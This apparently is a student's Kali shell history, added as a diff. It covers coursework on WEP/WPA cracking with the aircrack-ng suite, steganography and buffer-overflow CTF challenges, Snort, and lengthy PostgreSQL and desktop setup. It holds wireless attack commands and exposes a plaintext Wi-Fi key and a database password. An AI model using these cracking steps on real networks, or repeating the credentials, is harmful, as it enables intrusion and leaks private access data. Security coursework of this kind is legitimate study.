@@ -1,0 +1,999 @@
+  535  sudo kill 724
+  536  kill 833
+  537  sudo kill 833
+  538  airmon-ng check kill 
+  539  sudo airodump-ng 
+  540  cp /usr/share/wordlists/rockyou.txt ~/
+  541  sudo airmon-ng wlan1
+  542  sudo airodump-ng -c 7 --bssid DC:A6:32:1D:F2:8B -w ~/wpafile1 wlan1
+  543  sudo aircrack-ng -w ~/temp.txt -b  DC:A6:32:1D:F2:8B ~/*.cap
+  544  sudo aircrack-ng -w ~/rockyou.txt -b  DC:A6:32:1D:F2:8B ~/*.cap
+  545  cat rockyou.txt | grep -Ei '123456789'
+  546  cat rockyou.txt | grep -Pi '^123456789'
+  547  cat rockyou.txt | grep -Pi '^123456789$'
+  548  cat rockyou.txt | grep -Pin '^123456789$'
+  549  touch temp.txt
+  550  echo '123456789' > temp.txt
+  551  cat temp.txt
+  552  service networking restart
+  553  sudo service networking restart
+  554  sudo service NetworkManager restart
+  555  cd Cide
+  556  git clone git@github.com:arctic-cheetah/COMP4337.git
+  557  mkdir lab01
+  558  mkdir lab02
+  559  cd code
+  560  mv Lab-2.png ./COMP4337/lab02
+  561  git commit -m 'completed lab2'
+  562  ssh pi@192.168.4.1
+  563  cd Code
+  564  cd COMP4337
+  565  mkdir wep-crack
+  566  xdg-open Downloads
+  567  iwconfig
+  568  airmon-ng
+  569  sudo airmon-ng
+  570  sudo airmon-ng check
+  571  sudo airodump-ng wlan1
+  572  cd Code/COMP4337/
+  573  cd lab02
+  576  sudo aireplay-ng -3 -b DC:A6:32:1D:F2:8B -h B6:66:62:DE:9A:90  wlan1\n
+  577  aircrack-ng -b DC:A6:32:1D:F2:8B replay_arp-0227-115306.cap
+  578  aircrack-ng -b DC:A6:32:1D:F2:8B replay_arp-0227-120154.cap
+  581  airodump-ng -c 7 --bssid DC:A6:32:1D:F2:8B -w ./wep wlan1
+  584  rm ./*
+  585  rm -f ./*
+  588  sudo aireplay-ng -3 -b DC:A6:32:1D:F2:8B -h CC:EB:5E:41:4D:DC
+  589  sudo aireplay-ng -3 -b DC:A6:32:1D:F2:8B -h CC:EB:5E:41:4D:DC wlan1
+  590  aircrack-ng -b DC:A6:32:1D:F2:8B replay_arp-0227-121905.cap
+  592  aireplay-ng -1 0 -e creamPie -a DC:A6:32:1D:F2:8B -h D4:6D:6D:73:4D:03  wlan1
+  594  cd ~/Code/COMP4337/lab02
+  595  cd wep-crack
+  601  aircrack-ng -b DC:A6:32:1D:F2:8B replay_arp-0227-123228.cap
+  606  T
+  608  aireplay-ng -1 0 -e creamPie -a DC:A6:32:1D:F2:8B -h B6:66:62:DE:9A:90  wlan1
+  609  sudo aireplay-ng -1 0 -e creamPie -a DC:A6:32:1D:F2:8B -h B6:66:62:DE:9A:90  wlan1
+  612  cd replay_arp-0227-115306.cap ./Code/Comp4337/lab02/wep-crack
+  613  mv replay_arp-0227-115306.cap ./Code/Comp4337/lab02/wep-crack
+  615  mv replay_arp-0227-115306.cap ~/Code/Comp4337/lab02/wep-crack
+  616  cp replay_arp-0227-115306.cap ~/Code/Comp4337/lab02/wep-crack
+  617  cp replay_arp-0227-115306.cap ~/Code/COMP4337/lab02/wep-crack
+  618  mv replay_arp-0227-115306.cap ~/Code/COMP4337/lab02/wep-crack
+  619  sudo aireplay-ng -3 -b DC:A6:32:1D:F2:8B -h B6:66:62:DE:9A:90  wlan1
+  620  sudo system-ctl restart NetworkManager
+  622  sudo aireplay-ng -3 -b DC:A6:32:1D:F2:8B -h D4:6D:6D:73:4D:03 wlan1
+  623  sudo aireplay-ng -1 0 -e "AP name" -a "AP MAC address" -h  wlan1
+  625  sudo aireplay-ng -1 0 -e creamPie -a DC:A6:32:1D:F2:8B -h D4:6D:6D:73:4D:03  wlan0
+  626  sudo aireplay-ng -1 0 -e creamPie -a DC:A6:32:1D:F2:8B -h D4:6D:6D:73:4D:03  wlan1
+  627  sudo airmon-ng start wlan1
+  629  sudo airodump-ng check kill
+  630  sudo airomon-ng check kill
+  631  sudo airmon-ng check kill
+  632  sudo airodump-ng -c 7 --bssid DC:A6:32:1D:F2:8B -w ./wep wlan1
+  633  sudo systemctl restart NetworkManager
+  634  macchanger
+  641  gem
+  644  gem install zsteg
+  647  zsteg --all smiling.png
+  648  touch ~/.profile
+  649  nano ./profile
+  650  nano ./.profile
+  651  export PATH=$PATH:/home/k-730/.local/share/gem/ruby/3.1.0/bin
+  653  pip3 
+  654  sudo apt install python3-pillow
+  657  zsteg smiling.png b8,g,lsb,xy
+  658  zsteg smiling.png b8,g,lsb,yx
+  660  python3 tmp.py
+  661  echo 'ZmxhZ3tnMWZfb3JfajFmQ==' | base64 --decode
+  662  echo 'ZmxhZ3tnMWZfb3JfajFmfQ== ' | base64 --decode
+  663  /usr/bin/python /home/k-730/Downloads/tmp.py
+  672  gcc temp.c -o temp
+  675  cp Temp.class Temp.txt
+  676  javap Temp.java
+  678  \tjavap bitecode.class
+  680  javac Temp.java 
+  681  javap Temp.class
+  682  touch temp.java
+  684  python3 
+  686  ./temp
+  687  tshark -r ~/sfwn/part-B-trace.pcap -YV -t json "frame.number == 112"
+  688  tshark -r ~/sfwn/part-B-trace.pcap -YV -T json "frame.number == 112"
+  689  tshark -r ~/sfwn/part-B-trace.pcap -T json -YV "frame.number == 112"
+  690  tshark -r ~/sfwn/part-B-trace.pcap -t json -V "frame.number == 112"
+  691  tshark -r ~/sfwn/part-B-trace.pcap -T json -V "frame.number == 112"
+  692  tshark -r ~/sfwn/part-B-trace.pcap  -V "frame.number == 112"
+  693  tshark -r ~/sfwn/part-B-trace.pcap  -V "frame.number == 113"
+  694  tshark -r ~/sfwn/part-B-trace.pcap -T json -V "frame.number == 113"
+  697  snort
+  698  ls /etc/snort/rules
+  702  ls /etc/snort/rules/local.rules
+  705  sudo snort -c /etc/snort/rules/local.rules -l /var/log/snort/ -K ascii -i wlan0
+  706  sudo snort -c /etc/snort/rules/local.rules -l /var/log/snort/ -k ascii -i wlan0
+  712  sudo nano /etc/snort/rules/local.rules
+  713  sudo snort -c /etc/snort/rules/local.rules -l /var/log/snort/ -i wlan0
+  716  tshark -r ~/sfwn/part-A-trace.pcap -z "follow,tcp,ascii,192.168.1.1:1101,84.244.1.30:5050"
+  719  ls -a
+  720  ls -al .config
+  721  ls -al .config/nautilus
+  722  ls -al .config/qterminal.org
+  726  ls postgres17
+  729  ls postgres17/src
+  730  ls postgres17/src/lib
+  731  ls postgres17/
+  732  ls postgres17/src/bin
+  734  cd
+  735  cd\\n
+  737  cd postgres
+  741  ./configure --prefix=~/postgres14
+  744  mkdir postgres-data
+  748  cd ~/postgres13
+  757  sudo nano /etc/environment
+  758  export PGPASSWORD='1' && psql -U postgres -h 127.0.0.1 -p 5432 -d postgres
+  759  PGPASSWORD='1' && psql -U postgres -h 127.0.0.1 -p 5432 -d postgres
+  763  psql -U k-730 -h 127.0.0.1 -p 5432 -d k-730
+  765  mv env postgres13
+  770  apt install postgresql\n
+  771  sudo apt install postgresql\n
+  772  sudo dpkg --configure -a'
+  778  ks
+  782  mv postgresql-17.0.tar.gz ..
+  783  cd ~
+  786  rm kali-archive-keyring_2024.1_all.deb
+  787  tar -xvf postgresql-17.0.tar.gz
+  789  cd postgresql-17.0
+  791  mkdir ~/postgres17
+  793  pwd
+  797  PGHOME
+  801  PGHOME=/home/k-730/postgres13\nPGDATA=/home/k-730/postgres-data\nPGHOST=$PGDATA\nLD_LIBRARY_PATH=$PGHOME/lib\nPATH=$PGHOME/bin:$PATH\nexport PGDATA PGHOST LD_LIBRARY_PATH PATH PGHOME
+  802  $PGHOME
+  812  sudo lsof -i :5432
+  813  kill 107837
+  814  sudo kill 107837
+  815  cd post*
+  816  cd postgres17
+  818  ./home/k-730/postgresql-17.0/configure
+  820  sudo apt-get install flex bison
+  822  sudo apt-get install readline
+  824  sudo apt-get libreadline-dev
+  825  apt-cache search libreadline
+  826  bash /home/k-730/postgresql-17.0/configure
+  827  sudo apt-get libreadline
+  828  sudo apt-get readline
+  829  sudo apt-get install libreadline6 libreadline6-dev
+  830  sudo apt-get install libreadline6 libreadline-dev
+  831  sudo apt-get install libreadline-dev
+  833  ~/postgres-17.0/configure
+  834  bash ~/postgres-17.0/configure
+  835  bash ~/postgresql-17.0/configure
+  844  ls config
+  868  ls -l src
+  885  bash p1
+  888  $PGHOME/bin/pg_ctl stop
+  889  $PGHOME/bin/pg_ctl start
+  890  sudo p1
+  891  sudo
+  892  sudo source env
+  894  echo $PGHOME
+  896  ls -l src/bin
+  897  src/bin/pg_ctl
+  903  make world-bin\n
+  906  make check
+  910  tmp install
+  911  ls tmp_install
+  914  sudo pg_ctl
+  916  mv env ..
+  918  rm -fr postgres17
+  920  rm -fr postgresql-17.0
+  921  rm -fr postgresql-17.0*
+  925  tar -xvf postgresql-14.18.tar.gz
+  927  cd postgresql-14.18
+  931  mkdir postgres14
+  932  cd postgres14
+  933  ~/postgresql-14.18/configure
+  935  make all
+  937  make install 
+  938  sudo make install 
+  939  la
+  947  ls src
+  948  ls src/bin
+  949  make world -j 4
+  953  sudo useradd postgres\nsudo passwd postgres\nsudo mkdir -p /pgdatabase/data\nsudo chown -R postgres: /pgdatabase/data\nsudo sh -c "echo 'export PATH=$PATH:/opt/PostgreSQL/bin' > /etc/profile.d/postgres.sh"\nsource /etc/profile.d/postgres.sh
+  955  whereis postgres
+  958  su postgres
+  960  sudo apt-get install postgresql
+  963  sudo apt-get install pgAdmin
+  964  curl -fsS https://www.pgadmin.org/static/packages_pgadmin_org.pub | sudo gpg --dearmor -o /usr/share/keyrings/packages-pgadmin-org.gpg\n
+  965  sudo sh -c 'echo "deb [signed-by=/usr/share/keyrings/packages-pgadmin-org.gpg] https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/$(lsb_release -cs) pgadmin4 main" > /etc/apt/sources.list.d/pgadmin4.list && apt update'
+  966  sudo apt install pgadmin4
+  969  sudo service postgresql
+  970  sudo service postgresql start
+  971  pg_ctl
+  973  find /usr/lib/postgresql/
+  974  find /usr/lib/postgresql/ -name pg_ctl
+  975  whereis pg_ctl
+  976  /usr/lib/postgresql/17/bin/pg_ctl
+  977  /usr/lib/postgresql/17/bin/pg_ctl start 
+  978  createdb
+  980  whereis postgresql.conf
+  981  ls /usr/lib/postgresql/
+  982  ls /usr/lib/postgresql/17
+  983  ls /usr/lib/postgresql/17/lib
+  984  ls /usr/lib
+  985  ls /usr/local
+  987  ls /usr/local/pgsql/bin
+  992  cd postgres-data
+  995  /usr/local/pgsql/bin/initdb
+  997  nano postgresql.conf
+  999  /usr/local/pgsql/bin/pg_ctl -D /home/k-730/postgres-data -l logfile start
+ 1003  /usr/local/pgsql/bin/psql
+ 1004  sudo apt-remove postgres
+ 1006  sudo apt remove postgresql
+ 1007  ls /usr/local/pgsql/share
+ 1009  ls /usr/local/
+ 1010  rm -fr /usr/local/pgsql
+ 1011  sudo rm -fr /usr/local/pgsql
+ 1013  sudo rm -fr /usr/lib/postgresql /etc/postgresql /usr/share/postgresql
+ 1014  cd ~/postgres14
+ 1020  sudo make install
+ 1022  ls /usr/local/pgsql/lib/pgxs/src/Makefile.global
+ 1023  ls /usr/local/pgsql/lib
+ 1024  ls /usr/local/pgsq
+ 1025  ls /usr/local/pgsql
+ 1027  cd ,,
+ 1030  rm -fr postgres*
+ 1031  mv ~/Downloads/postgres* .
+ 1033  tar -xvf postgresql*
+ 1035  cd postgresql-13.15
+ 1037  ./configure
+ 1040  mkdir postgres13
+ 1042  ~/postgresql-13.15/configure
+ 1046  ~/postgresql-13.15/configure --prefix ~/postgres13
+ 1055  ~/postgresql-13.15/configure --prefix=~/postgres13
+ 1057  ~/postgresql-13.15/configure --prefix=/home/k-730/postgres13
+ 1058  ~/postgresql-13.15/configure --prefix='/home/k-730/postgres13'
+ 1060  make -j 4
+ 1063  ls bin
+ 1073  cd ~[200~ env            
+ 1075  initdb env            \n
+ 1076  ls            \n
+ 1077  mkdir data
+ 1078  cd ~/postgres-data
+ 1079  initdb
+ 1084  /home/k-730/postgres13\npg_ctl -D /home/k-730/postgres-data -l logfile start
+ 1087  lsof -i:5432
+ 1089  sudo nano postgresql.conf
+ 1093  sudo rm -fr /usr/bin/psql /home/k-730/postgres13/bin/psql /usr/share/man/man1/psql.1.gz
+ 1094  ls /usr/bin/psql
+ 1096  make install
+ 1107  nano ~/.bashrc
+ 1113  p0
+ 1114  cat log*
+ 1117  createdb k-730
+ 1119  sudo apt install postgresql-client
+ 1121  whereis psql
+ 1122  psql
+ 1124  su root
+ 1125  su
+ 1127  nano /etc/apt/sources.list.d
+ 1128  ls /etc/apt/sources.list.d
+ 1129  rm /etc/apt/sources.list.d/pgadmin4.list
+ 1130  sudo rm /etc/apt/sources.list.d/pgadmin4.list
+ 1134  sudo passwd
+ 1135  passwd root
+ 1136  sudo passwd root
+ 1137  sudo apt install x-window-system
+ 1138  apt-get install xorg
+ 1139  sudo apt-get install xorg
+ 1140  sudo apt-get dist upgrade
+ 1141  sudo apt-get remove lightdm
+ 1142  sudo apt-get remove kali-desktop-xfce
+ 1143  sudo apt-get install kali-desktop-xfce
+ 1145  sudo mv ~/.Xauthority ~/.Xauthority.backup sudo chmod 700 ~ sudo chown -R kali:kali ~ sudo service lightdm restart
+ 1146  sudo mv ~/.Xauthority ~/.Xauthority.backup
+ 1147  sudo chmod 700 ~ 
+ 1148  sudo chown -R kali:kali ~ 
+ 1149  sudo chown -R k-730:k-730 ~ 
+ 1151  sudo apt autoremove
+ 1152  sudo service lightdm restart
+ 1153  df -h
+ 1154  chmod -R 755 /home/k-730
+ 1155  sudo dpkg-reconfigure lightdm
+ 1157  sudo apt-get install --reinstall xserver-org
+ 1158  sudo apt-get install --reinstall xserver-xorg
+ 1159  reboot
+ 1164  sudo user
+ 1165  sudo useradd -m temp
+ 1166  sudo passwd temp
+ 1169  whereis postgresql
+ 1171  sudo apt-uninstall postgresql
+ 1172  sudo rm -fr /usr/lib/postgresql /usr/share/postgresql
+ 1176  whereis postgresql-17
+ 1177  ls /usr/share/postgresql/17/man/man1/psql.1.gz
+ 1178  ls /usr/share/postgresql/17
+ 1179  ls /usr/share/postgresql
+ 1184  sudo mv /var/lib/dpkg/info/postgresql-17* /tmp
+ 1185  ls /var/lib/dpkg/info
+ 1186  ls /var/lib/dpkg/info | grep -E 'post'
+ 1187  ls /var/lib/dpkg/info | grep -E 'postgres'
+ 1188  ls /tmp
+ 1189  sudo mv /var/lib/dpkg/info/postgres* /tmp
+ 1192  sudo apt-remove postgresql
+ 1193  sudo apt-get --purge remove postgresql
+ 1195  dpkg --configure -a
+ 1196  sudo dpkg --configure -a
+ 1200  udo bettercap -eval "ui on"\n
+ 1201  sudo bettercap -eval "ui on"\n
+ 1202  curl https://5b9ebd5c0d2dfa4b.beta.noctf.dev/files/local/lmiPtAI-Y4Dn1rzpaNH7W?iat=1748934000&sig=vLvI-NfbekMZ4iKnIoRXkAMJ9q1TQ55tndUmizYSm-A
+ 1205  pip3 install pillow
+ 1206  /home/k-730/Downloads/impossible/.venv/bin/python -m pip3 install pillow
+ 1207  pipx install pycryptodome
+ 1208  python3 app/utils/crypto.py
+ 1209  bin/python3.13
+ 1210  ./bin/python3.13
+ 1211  /home/k-730/Downloads/impossible/bin/python3.13
+ 1212  /home/k-730/Downloads/impossible/bin/python3.13 /home/k-730/Downloads/impossible/app/utils/crypto.py
+ 1213  /home/k-730/Downloads/impossible/bin/python /home/k-730/Downloads/impossible/app/utils/crypto.py
+ 1219  cd Down*
+ 1223  cd impossible
+ 1224  xdg-open . &
+ 1226  sudo apt install gnome-terminal\n
+ 1227  curl -o https://desktop.docker.com/linux/main/amd64/docker-desktop-amd64.deb?utm_source=docker&utm_medium=webreferral&utm_campaign=docs-driven-download-linux-amd64
+ 1228  curl -o docker-desktop https://desktop.docker.com/linux/main/amd64/docker-desktop-amd64.deb?utm_source=docker&utm_medium=webreferral&utm_campaign=docs-driven-download-linux-amd64
+ 1229  curl https://desktop.docker.com/linux/main/amd64/docker-desktop-amd64.deb?utm_source=docker&utm_medium=webreferral&utm_campaign=docs-driven-download-linux-amd64
+ 1230  curl 'https://desktop.docker.com/linux/main/amd64/docker-desktop-amd64.deb?utm_source=docker&utm_medium=webreferral&utm_campaign=docs-driven-download-linux-amd64' -o docker.deb
+ 1232  dpkg -i docker.deb
+ 1233  sudo dpkg -i docker.deb
+ 1234  dpkg: error processing package docker-desktop (--install):
+ 1235  Processing triggers for kali-menu (2025.2.7) ...
+ 1236  Processing triggers for desktop-file-utils (0.28-1) ...
+ 1237  Processing triggers for mailcap (3.74) ...
+ 1238  Errors were encountered while processing:
+ 1239  qemu-system-x86 (>= 5.2.0); however:
+ 1241  rm -fr docker*
+ 1242  iwlist wlan0 scan
+ 1243  iwconfig wlan0 essid R-Link key w7kehdwr2n1
+ 1244  sudo iwconfig wlan0 essid R-Link key w7kehdwr2n1;
+ 1245  sudo iwconfig wlan0 essid R-Link key w7kehdwr2n1
+ 1246  sudo iwconfig wlan0 essid 'R-Link' key 'w7kehdwr2n1'
+ 1247  sudo iwconfig wlan0 essid 'R-Link' key s:'w7kehdwr2n1'
+ 1248  sudo iwconfig wlan0 essid R-Link key s:w7kehdwr2n1
+ 1249  ls /etc/wpa_supplicant/wpa_supplicant.conf
+ 1250  ls /etc/wpa_supplicant/
+ 1251  pip3 install flask
+ 1253  pipx install flask
+ 1254  /home/k-730/Downloads/impossible/.venv/bin/pip3 flask
+ 1255  /home/k-730/Downloads/impossible/.venv/bin/pip3 install flask
+ 1256  /home/k-730/Downloads/impossible/.venv/bin/pip3 install pycryptodome
+ 1259  /home/k-730/Downloads/impossible/.venv/bin/python /home/k-730/Downloads/impossible/app/utils/crypto.py
+ 1262  python3 -m venv .venv\n
+ 1264  /home/k-730/Downloads/impossible/.venv/bin/pip3.13 install flask pycryptodome
+ 1265  /home/k-730/Downloads/impossible/.venv/bin/python /home/k-730/Downloads/impossible/app/main.py
+ 1267  ls postgres13
+ 1268  ls postgres13/bin
+ 1269  xdg-open . postgres13/bin
+ 1270  xdg-open  postgres13/bin
+ 1272  history | grep -Pi 'make'
+ 1273  cd important
+ 1275  cd Downloads/Important
+ 1276  cd ~/Downloads/Important
+ 1277  cd ~/Downloads/impossible
+ 1278  code
+ 1284  rm -fr impossible
+ 1286  tar -xvf actually-proxed.tar.gz
+ 1287  unzip impossible.zip
+ 1288  code impossible
+ 1292  sudo apt install imagemagick\n
+ 1294  /bin/python2 /home/k-730/.vscode/extensions/ms-python.python-2025.6.1-linux-x64/python_files/printEnvVariablesToFile.py /home/k-730/.vscode/extensions/ms-python.python-2025.6.1-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 1298  sudo apt install -y kali-desktop-gnome
+ 1309  sudo apt purge gnome-core --autoremove
+ 1310  sudo apt purge kali-desktop-gnome --autoremove
+ 1311  sudo dpkg -l | grep .gnome
+ 1314  sudo apt install -y kali-desktop-xfce4
+ 1315  sudo apt install -y kali-desktop-xfce
+ 1317  nano ~/.session
+ 1318  nano ~/.xsession
+ 1320  /usr/bin/xfce4-session
+ 1322  sudo apt purge kali-desktop-xfce --autoremove
+ 1323  sudo apt reinstall
+ 1324  sudo apt reinstall kali-desktop-xfce
+ 1326  sudo reboot
+ 1327  sudo update-alternatives --config x-session-manager
+ 1331  xdg-open Pictures
+ 1332  sudo apt install -y docker.io\n
+ 1333  sudo systemctl enable docker --now\n
+ 1335  sudo usermod -aG docker $USER
+ 1336  echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \\n  sudo tee /etc/apt/sources.list.d/docker.list \n
+ 1337  curl -fsSL https://download.docker.com/linux/debian/gpg |\n  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+ 1338  sudo apt update
+ 1339  sudo apt install -y docker-ce docker-ce-cli containerd.io
+ 1341  sudo apt-get install gcc-multilib g++-multilib libc6-dev-i386 libc6:i386 gdb-multiarch
+ 1342  sudo apt-get install gcc-multilib g++-multilib libc6-dev-i386 libc6:i386 gdb-multiarch
+ 1343  sudo apt-get install gcc-multilib g++-multilib libc6-dev-i386 gdb-multiarch
+ 1345  lsb_release -a
+ 1346  lsb_release 
+ 1347  fastfetch
+ 1350  bash
+ 1355  file vuln
+ 1356  checksec
+ 1357  checksec vuln
+ 1360  checksec --file vuln
+ 1361  checksec --file=vuln
+ 1362  checksec --file=vuln --output=json
+ 1363  checksec --file=vuln --output=yaml
+ 1364  checksec --file=vuln --output=xml
+ 1365  checksec -v
+ 1366  checksec -v-version
+ 1367  checksec --version
+ 1368  whereis checksec
+ 1370  ls /usr/bin/
+ 1371  gdb 0v
+ 1372  gdb -v
+ 1373  man gdb
+ 1375  gdb --versin
+ 1376  gdb --version
+ 1377  man ghidra_auto
+ 1378  whereis ghidra_auto
+ 1379  ghidra_auto
+ 1380  man ghidra
+ 1381  ghidra
+ 1382  ghidra ./Downloads/vuln
+ 1386  sudo apt-get vlc
+ 1387  sudo apt-get install vlc
+ 1388  echo $PYTHONPATH
+ 1389  which python3
+ 1390  man pipx
+ 1391  pip3
+ 1393  pip3 environment
+ 1394  pipx environment
+ 1396  echo "hello there" > flag.txt
+ 1397  ls | grep -Pi 'flag'
+ 1401  pythone
+ 1402  pyton3
+ 1404  pip3 install pwn
+ 1405  apt install python3 pwn
+ 1406  sudo apt install python3 pwn
+ 1407  pipx install pwn
+ 1410  pipx install --include-deps pwn
+ 1411  pipx install --include-deps pwntools
+ 1412  pipx install --include-deps --force pwntools 
+ 1413  pipx remove pwn
+ 1414  pipx uninstall pwn
+ 1415  pipx uninstall pwntools
+ 1416  pipx install pwntools --global
+ 1417  sudo pipx install pwntools --global
+ 1418  pip3 list
+ 1419  pwntools
+ 1420  sudo pipx install pwntools
+ 1421  unhex
+ 1422  unhex 78
+ 1423  whereis pwntools
+ 1426  pipx pwntools
+ 1429  /bin/python /home/k-730/Downloads/tmp2.py
+ 1431  code Downloads
+ 1432  cat .bashrc
+ 1434  unhex 0xfff
+ 1435  unhex fff
+ 1436  unhex ffff
+ 1437  unhex 76
+ 1438  gdb
+ 1446  echo exploit.txt > ./vuln 
+ 1447  echo exploit.txt | ./vuln 
+ 1448  \x04\x08\xd6\x87\x04\x08
+ 1449  echo -n exploit.txt | ./vuln 
+ 1450  M\ntest\nI\nY\nL
+ 1457  7d
+ 1458  python exploit.py
+ 1460  rm vuln
+ 1461  rm vuln(1).c
+ 1462  rm 'vuln (1).c'
+ 1463  nc mercury.picoctf.net 4593
+ 1468  sbin
+ 1469  echo $PATH
+ 1470  postgres
+ 1472  echo $PATH | grep -Pi '~'
+ 1473  echo $PATH | grep -Pi '.local'
+ 1474  ~
+ 1475  pwd ~
+ 1476  ls ~
+ 1478  pwn
+ 1480  hex
+ 1481  hex և\4\8
+ 1482  և\4\8
+ 1483  hex և^D^H
+ 1484  kill 
+ 1485  cat tmp2.txt | ./vuln2
+ 1486  I
+ 1487  Y
+ 1488  test
+ 1489  gcc vuln.c -fno-stack-protector -m32 -z execstack -R -o vuln2
+ 1490  gcc vuln.c -fno-stack-protector -R -m32 -z execstack -o vuln2
+ 1491  gcc vuln.c -fno-stack-protector -RL -m32 -z execstack -o vuln2
+ 1492  gcc vuln.c -fno-stack-protector -m32 -z execstack -RL -o vuln2
+ 1493  gcc vuln.c -fno-stack-protector -m32 -z execstack -L -o vuln2
+ 1494  gcc vuln.c -RL -fno-stack-protector -m32 -z execstack -o vuln2
+ 1495  gcc vuln.c -L -fno-stack-protector -static-pie  -m32 -z execstack -o vuln2
+ 1496  gcc vuln.c -L -fno-stack-protector -no-pie  -m32 -z execstack -o vuln2
+ 1497  gcc vuln.c -L -fno-stack-protector -no-pie  -m32 -z execstack -o vuln3
+ 1498  ./vuln3
+ 1499  gcc vuln.c -L -fno-stack-protector -static-pie  -m32 -z execstack -o vuln1
+ 1500  gcc vuln.c -L -fno-stack-protector -no-pie  -m32 -z execstack -o vuln1
+ 1501  ./vuln1
+ 1502  gcc vuln.c -L -fno-stack-protector -m32 -z execstack -o vuln2
+ 1504  >>> 
+ 1509  gdbserver ./vuln
+ 1510  man gdb | grep -Pi '\-x'
+ 1511  /bin/gdb ./vuln -x /tmp/pwnlib-gdbscript-i_4jug24.gdb
+ 1512  ls /tmp/pwnlib-gdbscript-i_4jug24.gdb
+ 1517  ascii
+ 1521  "%x", res);
+ 1522  gdb ./vuln
+ 1524  \x04\x08
+ 1525  gcc -fno-stack-protector -m32 -z -v vuln.c -o vuln
+ 1526  gcc -fno-stack-protector -m32 -z execstack -v vuln.c -o vuln
+ 1527  dcc
+ 1528  echo exploit.txt
+ 1529  cat exploit.txt > ./vuln
+ 1530  gcc -fno-stack-protector -m32 -z execstack -o vuln
+ 1531  gcc -i vuln.c -fno-stack-protector -m32 -z execstack -o vuln
+ 1532  gcc vuln.c -fno-stack-protector -m32 -z execstack -o vuln
+ 1533  python3 exploit.py  mercury.picoctf.net 4593
+ 1536  python3 exploit.py REMOTE  mercury.picoctf.net 4593
+ 1538  echo exploit.txt | ./vuln
+ 1539  cat exploit.txt | ./vuln
+ 1540  gcc vuln.c -fno-stack-protector -m32 -z execstack -o vuln2
+ 1541  cat exploit.txt
+ 1542  cat exploit.txt | ./vuln2
+ 1543  ./vuln2
+ 1544  vuln
+ 1545  ./vuln
+ 1546  6
+ 1547  cd DOwnloads
+ 1548  cd Dpwnloads
+ 1551  code vuln.c
+ 1552  ls -a 
+ 1553  ls -al 
+ 1554  chmod -R 755 vuln
+ 1555  init-pwndbg
+ 1557  ls /usr/bin/checksec
+ 1558  echo $SHELL
+ 1562  ls -la
+ 1563  nano .zshrc
+ 1564  man gcc
+ 1565  ls .config
+ 1566  ls .config/xf4ce
+ 1567  ls .config/xfce4
+ 1568  ls .config/xfce4/xconf
+ 1569  cat .config/xfce4/xconf
+ 1570  cat .config/xfce4/xfconf
+ 1571  ls.config/xfce4/xfconf
+ 1572  ls .config/xfce4/xfconf
+ 1573  xfconf-query
+ 1574  xfce4-terminal
+ 1575  ls .config/qterminal
+ 1576  ls .config/
+ 1577  ls .config/qterminal.org
+ 1578  ls .config/qterminal.org/qterminal.ini
+ 1579  nano .config/qterminal.org/qterminal.ini
+ 1581  ls .bashrc
+ 1582  p1
+ 1584  sudo apt install ./pwndbg_2025.05.30_amd64.deb
+ 1585  tree Downloads
+ 1586  tree ~/Downloads
+ 1587  dpkg --list | grep -Pi 'post'
+ 1588  man dpkg 
+ 1589  man dpkg | grep -Pi '\-s'
+ 1590  man dpkg | grep -Pi '^\-s'
+ 1591  dpkg -s postgresql-16
+ 1592  dpkg -r postgresql-16
+ 1593  sudo dpkg -r postgresql-16
+ 1594  sudo dpkg -p postgresql-16
+ 1595  sudo dpkg --purge postgresql-16-pg-gvm
+ 1596  sudo dpkg --purge postgresql-16
+ 1597  dpkg --list | grep -Pi 'postgres' -l
+ 1598  man grep | grep -Pi 'match'
+ 1599  man grep | grep -Pi '\-o'
+ 1600  dpkg --list | grep -Pi 'postgres' -o
+ 1601  dpkg --list | grep -Pi 'postgres\w+' -o
+ 1602  dpkg --list | grep -Pi 'postgres[a-z,_-]' -o
+ 1603  dpkg --list | grep -Pi 'postgres[a-z,_\-]' -o
+ 1604  dpkg --list | grep -Pi 'postgres'
+ 1605  dpkg --list | grep -Pi 'postgres[a-z,_\\-]' -o
+ 1606  dpkg --list | grep -Pi 'postgres[A-Za-z,_\\-]' -o
+ 1607  dpkg --list | grep -Pi 'postgresql' -o
+ 1608  dpkg --list | grep -P 'postgresql[\-]' -o
+ 1609  dpkg --list | grep -P 'postgresql[\-]\w+' -o
+ 1610  dpkg --list | grep -P 'postgresql([\-]\w+)+' -o | dpkg --purge 
+ 1611  dpkg --list | grep -P 'postgresql([\-]\w+)+' -o | sudo dpkg --purge 
+ 1612  sudo dpkg --purge  postgresql-17postgresql-17-pg-gvmpostgresql-client-16 postgresql-client-17 postgresql-client-common postgresql-common\n
+ 1613  sudo dpkg --purge postgresql-17-pg-gvm
+ 1614  sudo dpkg --purge postgresql-17
+ 1615  sudo dpkg --purge postgresql-common
+ 1616  postgresql-17\npostgresql-17-pg-gvm\npostgresql-client-16\npostgresql-client-17\npostgresql-client-common\npostgresql-common\n
+ 1617  sudo dpkg --purge postgresql-client-17
+ 1618  sudo dpkg --purge postgresql-client-16
+ 1620  dpkg --list | grep -P 'postgresql([\-]\w+)+' -o
+ 1621  sudo dpkg --purge postgresql-client-common
+ 1622  sudo apt-get update
+ 1623  sudo apt-get upgrade
+ 1624  sudo dpkg -i pwndbg_2025.05.30_amd64.deb
+ 1625  gdb-pwndbg vuln
+ 1626  gdb-pwndbg
+ 1628  pwndbg vuln
+ 1631  ls sfwn
+ 1632  ls go
+ 1633  sudo apt-get install gparted
+ 1634  gparted &
+ 1635  sudo apt-get install gparted -f
+ 1636  sudo apt-get install gparted --force
+ 1637  sudo apt-get --force-yes install gparted 
+ 1638  sudo apt-install remove gparted
+ 1639  sudo apt-get remove gparted
+ 1640  sudo apt-get -f install gparted 
+ 1641  sudo gparted &
+ 1644  sudo add-apt-repository -y ppa:teejee2008/timeshift\n
+ 1646  ls | grep -Pi 'time'
+ 1647  sudo apt-get install
+ 1648  sudo apt-get -f install
+ 1649  sudo dpkg -i timeshift_22.06.1_amd64.deb
+ 1650  timeshift
+ 1651  timeshift &
+ 1652  pipx
+ 1653  pipx list
+ 1654  pipx install pwntools
+ 1655  pip
+ 1656  pip install pwntools
+ 1657  /home/k-730/Downloads/.venv/bin/python /home/k-730/Downloads/tmp2.py
+ 1658  pipx install gdbserver
+ 1659  pipx install pyOCD
+ 1660  gdbserver
+ 1661  ls -1 | grep -Pi 'fake'
